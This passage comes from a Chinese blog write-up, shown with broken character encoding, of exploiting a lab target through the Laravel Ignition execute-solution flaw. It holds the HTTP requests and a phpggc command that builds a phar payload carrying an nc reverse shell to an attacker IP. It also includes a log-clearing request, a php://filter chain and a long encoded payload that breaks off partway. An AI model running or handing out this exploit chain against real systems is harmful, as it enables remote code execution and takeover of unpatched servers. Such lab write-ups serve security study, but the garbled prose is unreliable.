class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>168</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;xxxxxxx&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°èƒ½å¤Ÿæ‰§è¡Œï¼Œ</p><p>ä¸‹è½½GitHubä¸Šä¸‹è½½çš„dockerç¯å¢ƒä¸­å¸¦æœ‰expï¼Œä½¿ç”¨æ­¤expéœ€è¦ä¸‹è½½phpggc</p><p><code>git clone https://github.com/ambionics/phpggc.git</code></p><p>æ”¹ä¸€ä¸‹777çš„æƒé™ï¼Œä¸‹é¢ç”Ÿæˆpocçš„æ—¶å€™ä¼šç”¨åˆ°</p><p>è¿™é‡Œæˆ‘ä»¬ç”Ÿæˆpocã€‚è¦åˆ°åˆšåˆšphpggcç›®å½•ä¸‹ï¼Œä¸Šé¢é‚£ç¯‡æ–‡ç« ä¸­å·²ç»æœ‰phpinfoäº†ï¼Œè·Ÿç€å¤ç°å°±è¡Œäº†ï¼Œäº²æµ‹phpinfoæ²¡æœ‰é—®é¢˜ã€‚å› ä¸ºæˆ‘ä¸Šé¢expè„šæœ¬éƒ½ä¸èƒ½ç”¨ï¼Œæ‰€ä»¥æƒ³ç€æœä¸€ä¸ªæ‰‹å·¥å¤ç°çš„æ‰“webshellçš„æ–¹æ³•ï¼Œå¥ˆä½•ç½‘ä¸Šçš„æ–¹æ³•éƒ½åªåˆ°phpinfoå°±ç»“æŸäº†ï¼Œå¹¶æ²¡æœ‰ç”Ÿæˆwebshellçš„ï¼Œå› ä¸ºè¿™é‡Œé¢æˆ‘ä»¬æ‰“ä¸€éphpinfoä¹‹åï¼Œæ—¥å¿—æ–‡ä»¶ä¼šé‡æ–°ç”Ÿæˆï¼ŒğŸå¹¶ä¸ä¼šç•™ç€æ—¥å¿—é‡Œï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æœ‰ä¸€ä¸ªåå¼¹shellçš„æ–¹æ³•ï¼Œæˆ–è€…ç”Ÿæˆwebshellï¼Œç»è¿‡æµ‹è¯•ï¼Œå¤ªèœäº†ï¼Œfileputcontentæ²¡æœ‰æˆåŠŸï¼Œechoä¹Ÿæ²¡æœ‰æˆåŠŸï¼Œä½†æ˜¯æ²¡ç»™pocï¼Œæˆ‘ä»¬è‡ªå·±æ‰“ä¸€ä¸‹</p><p>è¿™é‡Œæ˜¯åå¼¹shellçš„ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php7.4 -d <span class="string">&quot;phar.readonly=0&quot;</span> ./phpggc Laravel/RCE5 <span class="string">&quot;system(&#x27;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.144.128 9999 &gt;/tmp/f&#x27;);phpinfo();&quot;</span> --phar phar -o php://output | base64 -w 0 | python -c <span class="string">&quot;import sys;print(&#x27;&#x27;.join([&#x27;=&#x27; + hex(ord(i))[2:] + &#x27;=00&#x27; for i in sys.stdin.read()]).upper())&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129182228006.png" alt="image-20221129182228006"></p><p>ç”Ÿæˆä¸€ä¸²ç ï¼Œ</p><p>ä¸Šé¢å·²ç»è¯æ˜æ¼æ´å­˜åœ¨</p><p>ç„¶åbpå‘åŒ…ï¼Œæ¸…ç©ºæ—¥å¿—</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>328</span><br><span class="line"></span><br><span class="line"><span class="json">&#123;</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;solution&quot;</span>: <span class="string">&quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;</span>,</span></span><br><span class="line"><span class="json">  <span class="attr">&quot;parameters&quot;</span>: &#123;</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;variableName&quot;</span>: <span class="string">&quot;username&quot;</span>,</span></span><br><span class="line"><span class="json">    <span class="attr">&quot;viewFile&quot;</span>: <span class="string">&quot;php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log&quot;</span></span></span><br><span class="line"><span class="json">  &#125;</span></span><br><span class="line"><span class="json">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line">![image-20221129201015519](/images/vulntarget-e/image-20221129201015519.png)</span><br><span class="line"></span><br><span class="line">å‘é€å¦‚ä¸‹æ•°æ®åŒ…ï¼Œç»™Logå¢åŠ ä¸€æ¬¡å‰ç¼€ï¼Œç”¨äºå¯¹é½ï¼š</span><br><span class="line"></span><br><span class="line">```http</span><br><span class="line">POST /_ignition/execute-solution HTTP/1.1</span><br><span class="line">Host: 192.168.144.55</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">  &quot;parameters&quot;: &#123;</span><br><span class="line">    &quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">    &quot;viewFile&quot;: &quot;AA&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129201219036.png" alt="image-20221129201219036"></p><p>å°†POCä½œä¸ºviewFileçš„å€¼ï¼Œå‘é€æ•°æ®åŒ…ï¼Œè¿™é‡Œæœ€åæœ‰ä¸ªaåˆ«å¿˜äº†ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.144.55</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>5514</span><br><span class="line"></span><br><span class="line"><span class="dns">&#123;</span></span><br><span class="line"><span class="dns">  &quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span></span><br><span class="line"><span class="dns">  &quot;parameters&quot;: &#123;</span></span><br><span class="line"><span class="dns">    &quot;variableName&quot;: &quot;username&quot;,</span></span><br><span class="line"><span class="dns">    &quot;viewFile&quot;: &quot;=<span class="number">50=00=44=00</span>=<span class="number">39=00=77=00</span>=<span class="number">61=00=48=00</span>=<span class="number">41=00=67=00</span>=<span class="number">58=00=31=00</span>=<span class="number">39=00=49=00</span>=<span class="number">51=00=55=00</span>=<span class="number">78=00=55=00</span>=<span class="number">58=00=30=00</span>=<span class="number">4</span>E=<span class="number">00=50=00=54</span>=<span class="number">00=56=00=42</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=54=00=45</span>=<span class="number">00=56=00=53</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=37=00=49</span>=<span class="number">00=44=00=38</span>=<span class="number">00</span>=<span class="number">2</span>B=<span class="number">00=44=00=51</span>=<span class="number">00=70=00=63</span>=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=51</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=45=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=42</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=41=00=67</span>=<span class="number">00=41=00=41</span>=<span class="number">00</span>=<span class="number">54</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=53</span>=<span class="number">00=57=00=78</span>=<span class="number">00=73=00=64</span>=<span class="number">00=57=00=31</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=46=00=30</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=56=00=78</span>=<span class="number">00=43=00=63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=39=00=68</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=68=00=63</span>=<span class="number">00=33=00=52</span>=<span class="number">00=70=00=62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=64=00=63</span>=<span class="number">00=55=00=47</span>=<span class="number">00=56=00=75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=79=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=43</span>=<span class="number">00=49=00=36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">64</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=75</span>=<span class="number">00=64=00=48</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=73=00=62</span>=<span class="number">00=48=00=56</span>=<span class="number">00=74=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00=63=00=51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=58=00=45</span>=<span class="number">00=52=00=70</span>=<span class="number">00=63=00=33</span>=<span class="number">00=42=00=68</span>=<span class="number">00=64=00=47</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=59</span>=<span class="number">00=36=00=49</span>=<span class="number">00=67=00=41</span>=<span class="number">00=71=00=41</span>=<span class="number">00=48=00=46</span>=<span class="number">00</span>=<span class="number">31</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=56</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">55</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">56</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00=78=00=32</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=32=00=45</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00=61=00=54</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=76</span>=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=54</span>=<span class="number">00=47=00=39</span>=<span class="number">00</span>=<span class="number">68</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=56</span>=<span class="number">00=79=00=58</span>=<span class="number">00=45=00=56</span>=<span class="number">00=32=00=59</span>=<span class="number">00=57=00=78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=58=00=49</span>=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=41=00=36</span>=<span class="number">00=65=00=33</span>=<span class="number">00=31=00=70</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">30</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=73=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=39</span>=<span class="number">00=66=00=58</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">44</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=51=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=67=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=73=00=62</span>=<span class="number">00=48=00=56</span>=<span class="number">00=74=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=56</span>=<span class="number">00=63=00=51</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=76=00=59</span>=<span class="number">00=57=00=52</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=59=00=58</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=61</span>=<span class="number">00=57=00=35</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=58=00=45</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=79=00=62</span>=<span class="number">00=32=00=46</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">46</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=64=00=45</span>=<span class="number">00=56=00=32</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=57=00=35</span>=<span class="number">00=30=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=45=00=77</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00=35=00=75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=30=00=61</span>=<span class="number">00=57=00=39</span>=<span class="number">00=75=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=74=00=50</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">79</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">69</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">72</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=35=00=58</span>=<span class="number">00=45=00=64</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">62</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=56=00=79</span>=<span class="number">00=59=00=58</span>=<span class="number">00=52=00=76</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=72=00=52</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=35=00=70</span>=<span class="number">00=64=00=47</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=76=00=62</span>=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=70=00=37</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=69=00=49</span>=<span class="number">00</span>=<span class="number">41</span>=<span class="number">00</span>=<span class="number">4</span>B=<span class="number">00=67=00=42</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=62=00=32</span>=<span class="number">00</span>=<span class="number">35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=63=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=30=00=38</span>=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00=55=00=36</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00=31=00=76</span>=<span class="number">00=59=00=32</span>=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=63=00=52</span>=<span class="number">00=32=00=56</span>=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00=68=00=64</span>=<span class="number">00=47=00=39</span>=<span class="number">00=79=00=58</span>=<span class="number">00=45=00=31</span>=<span class="number">00=76=00=59</span>=<span class="number">00=32=00=74</span>=<span class="number">00=44=00=62</span>=<span class="number">00=32=00=35</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=61=00=57</span>=<span class="number">00=64=00=31</span>=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=46=00=30</span>=<span class="number">00=61=00=57</span>=<span class="number">00=39=00=75</span>=<span class="number">00</span>=<span class="number">49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">74</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00=63=00=36</span>=<span class="number">00=49=00=67</span>=<span class="number">00=41=00=71</span>=<span class="number">00=41=00=47</span>=<span class="number">00=35=00=68</span>=<span class="number">00=62=00=57</span>=<span class="number">00=55=00=69</span>=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00</span>=<span class="number">33</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=59</span>=<span class="number">00</span>=<span class="number">57</span>=<span class="number">00</span>=<span class="number">4</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=47=00=56</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=79=00=49</span>=<span class="number">00=37=00=66</span>=<span class="number">00</span>=<span class="number">58</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00</span>=<span class="number">36</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=69=00=41</span>=<span class="number">00</span>=<span class="number">43</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00=41=00=59</span>=<span class="number">00=32=00=39</span>=<span class="number">00</span>=<span class="number">6</span>B=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00=53=00=49</span>=<span class="number">00=37=00=63</span>=<span class="number">00</span>=<span class="number">7</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>F=<span class="number">00</span>=<span class="number">78</span>=<span class="number">00</span>=<span class="number">4</span>D=<span class="number">00=54=00=67</span>=<span class="number">00=36=00=49</span>=<span class="number">00</span>=<span class="number">6</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">77</span>=<span class="number">00</span>=<span class="number">2</span>F=<span class="number">00=63=00=47</span>=<span class="number">00=68=00=77</span>=<span class="number">00=49=00=48</span>=<span class="number">00</span>=<span class="number">4</span>E=<span class="number">00=35=00=63</span>=<span class="number">00=33=00=52</span>=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00=62=00=53</span>=<span class="number">00</span>=<span class="number">67</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00</span>=<span class="number">63</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=30=00=67</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=33=00=52</span>=<span class="number">00=74=00=63</span>=<span class="number">00=43=00=39</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">4</span>F=<span class="number">00=32=00=31</span>=<span class="number">00</span>=<span class="number">72</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00=62=00=79</span>=<span class="number">00=41=00=76</span>=<span class="number">00=64=00=47</span>=<span class="number">00=31=00=77</span>=<span class="number">00</span>=<span class="number">4</span>C=<span class="number">00=32=00=59</span>=<span class="number">00=37=00=59</span>=<span class="number">00=32=00=46</span>=<span class="number">00=30=00=49</span>=<span class="number">00=43=00=39</span>=<span class="number">00=30=00=62</span>=<span class="number">00=58=00=41</span>=<span class="number">00</span>=<span class="number">76</span>=<span class="number">00</span>=<span class="number">5</span><span class="keyword">A</span>=<span class="number">00</span>=<span class="number">6</span>E=<span class="number">00=77=00=76</span>=<span class="number">00</span>=<span class="number">59</span>=<span class="number">00</span>=<span class="number">6</span>D=<span class="number">00</span>=<span class="number">6</span>C=<span class="number">00</span>=<span class="number">75</span>=<span class="number">00</span>=<span class="number">4</span>C=<span 